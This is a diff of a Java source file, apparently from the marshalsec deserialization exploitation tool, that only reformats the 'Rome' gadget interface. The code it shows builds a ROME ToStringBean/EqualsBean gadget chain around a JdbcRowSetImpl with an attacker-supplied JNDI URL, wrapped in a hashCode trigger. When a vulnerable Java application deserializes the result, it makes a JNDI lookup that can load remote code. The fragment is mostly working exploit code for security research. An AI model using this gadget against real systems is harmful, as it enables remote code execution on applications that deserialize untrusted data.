@@ -26,29 +26,27 @@ package marshalsec.gadgets;
 import com.rometools.rome.feed.impl.EqualsBean;
 import com.rometools.rome.feed.impl.ToStringBean;
 import com.sun.rowset.JdbcRowSetImpl;
-
 import marshalsec.MarshallerBase;
 import marshalsec.UtilFactory;
 
 
 /**
  * @author mbechler
- *
  */
 public interface Rome extends Gadget {
 
     @Primary
-    @Args ( minArgs = 1, args = {
-        "jndiUrl"
+    @Args(minArgs = 1, args = {
+            "jndiUrl"
     }, defaultArgs = {
-        MarshallerBase.defaultJNDIUrl
-    } )
-    default Object makeRome ( UtilFactory uf, String[] args ) throws Exception {
-        return makeROMEAllPropertyTrigger(uf, JdbcRowSetImpl.class, JDKUtil.makeJNDIRowSet(args[ 0 ]));
+            MarshallerBase.defaultJNDIUrl
+    })
+    default Object makeRome(UtilFactory uf, String[] args) throws Exception {
+        return makeROMEAllPropertyTrigger(uf, JdbcRowSetImpl.class, JDKUtil.makeJNDIRowSet(args[0]));
     }
 
 
-    default <T> Object makeROMEAllPropertyTrigger ( UtilFactory uf, Class<T> type, T obj ) throws Exception {
+    default <T> Object makeROMEAllPropertyTrigger(UtilFactory uf, Class<T> type, T obj) throws Exception {
         ToStringBean item = new ToStringBean(type, obj);
         EqualsBean root = new EqualsBean(ToStringBean.class, item);
         return uf.makeHashCodeTrigger(root);
